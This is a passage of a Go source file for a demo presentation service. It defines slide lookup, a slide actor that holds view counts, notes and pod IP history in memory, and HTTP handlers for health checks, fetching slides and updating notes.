			SpeakerNotes: "Press H to reveal the top bar and live Substrate telemetry footer if hidden! Even this 16-slide presentation deck has been running as 16 sleeping gVisor actors on that same 3-pod WorkerPool. Thank the audience and share the GitHub repo.",
		},
	}
}

// GetSlideDef returns the slide definition matching the ID.
func GetSlideDef(id string) (SlideDef, bool) {
	for _, def := range AllSlideDefs() {
		if strings.EqualFold(def.ID, id) {
			return def, true
		}
	}
	return SlideDef{}, false
}

func cloneSlideData(in SlideData) SlideData {
	out := in
	out.Points = append([]string{}, in.Points...)
	out.HighlightPhrases = append([]string{}, in.HighlightPhrases...)
	out.Cards = append([]SlideCard{}, in.Cards...)
	if len(in.Columns) > 0 {
		out.Columns = make([]SlideColumn, len(in.Columns))
		for i, c := range in.Columns {
			out.Columns[i] = SlideColumn{
				Heading: c.Heading,
				Bullets: append([]string{}, c.Bullets...),
			}
		}
	}
	out.CodeLines = append([]string{}, in.CodeLines...)
	out.PuzzlePieces = append([]SlidePuzzlePiece{}, in.PuzzlePieces...)
	out.AgendaItems = append([]SlideAgendaItem{}, in.AgendaItems...)
	out.SignOffLines = append([]string{}, in.SignOffLines...)
	out.SubstrateFeatures = append([]string{}, in.SubstrateFeatures...)
	out.PodIPHistory = append([]string{}, in.PodIPHistory...)
	return out
}

// SlideActor manages the in-memory Go heap state for a single slide actor.
type SlideActor struct {
	mu           sync.Mutex
	data         SlideData
	initialNotes string
}

// NewSlideActor creates a SlideActor for a given slide ID.
func NewSlideActor(slideID string) *SlideActor {
	def, found := GetSlideDef(slideID)
	if !found {
		def = AllSlideDefs()[0]
	}
	ip := detectPodIP()
	return &SlideActor{
		data: SlideData{
			SlideDef:     def,
			ViewCount:    0,
			Notes:        "",
			PodIPHistory: []string{ip},
			CurrentPodIP: ip,
			LastWokenAt:  time.Now().UTC(),
		},
		initialNotes: "",
	}
}

func detectPodIP() string {
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ip4 := ipnet.IP.To4(); ip4 != nil {
					return ip4.String()
				}
			}
		}
	}
	return "127.0.0.1"
}

// BindSlideID binds the actor's static SlideDef to slideID when cloned from a
// shared ActorTemplate Golden Snapshot, preserving heap ViewCount, Notes, and PodIPHistory.
func (a *SlideActor) BindSlideID(slideID string) {
	if slideID == "" {
		return
	}
	def, found := GetSlideDef(slideID)
	if !found {
		return
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	a.data.SlideDef = def
}

func requestedSlideID(r *http.Request) string {
	if qid := strings.TrimSpace(r.URL.Query().Get("id")); qid != "" {
		return qid
	}
	if target := strings.TrimSpace(r.Header.Get("ate-target-actor")); target != "" {
		if idx := strings.LastIndexByte(target, '/'); idx >= 0 && idx+1 < len(target) {
			return target[idx+1:]
		}
		return target
	}
	return ""
}

// GetSlide returns a copy of the current slide data, incrementing ViewCount and recording pod IP.
func (a *SlideActor) GetSlide() SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.ViewCount++
	a.data.LastWokenAt = time.Now().UTC()
	ip := detectPodIP()
	a.data.CurrentPodIP = ip
	if len(a.data.PodIPHistory) == 0 || a.data.PodIPHistory[len(a.data.PodIPHistory)-1] != ip {
		a.data.PodIPHistory = append(a.data.PodIPHistory, ip)
	}

	return cloneSlideData(a.data)
}

// UpdateNote updates the live scratchpad note in Go heap RAM.
func (a *SlideActor) UpdateNote(note string) SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.Notes = strings.TrimSpace(note)
	a.data.LastWokenAt = time.Now().UTC()

	return cloneSlideData(a.data)
}

// ResetToInitial restores the slide notes to initial state (used for local simulation of revert).
func (a *SlideActor) ResetToInitial() SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.Notes = a.initialNotes
	a.data.LastWokenAt = time.Now().UTC()

	return cloneSlideData(a.data)
}

// NewActorMux creates the HTTP multiplexer for --mode=actor.
func NewActorMux(actor *SlideActor) *http.ServeMux {
	mux := http.NewServeMux()

	mux.HandleFunc("/readyz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	mux.HandleFunc("/api/slide", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			actor.BindSlideID(requestedSlideID(r))
			slide := actor.GetSlide()
			writeJSON(w, http.StatusOK, slide)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	})

	mux.HandleFunc("/api/slide/note", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		actor.BindSlideID(requestedSlideID(r))
		var req struct {
			Notes string `json:"notes"`
			Note  string `json:"note"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, fmt.Sprintf("invalid JSON payload: %v", err), http.StatusBadRequest)
			return
		}
		note := req.Notes
		if note == "" {
			note = req.Note
		}
		slide := actor.UpdateNote(note)
		writeJSON(w, http.StatusOK, slide)
	})

	return mux
}

func writeJSON(w http.ResponseWriter, status int, data any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(status)
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	_ = enc.Encode(data)
}
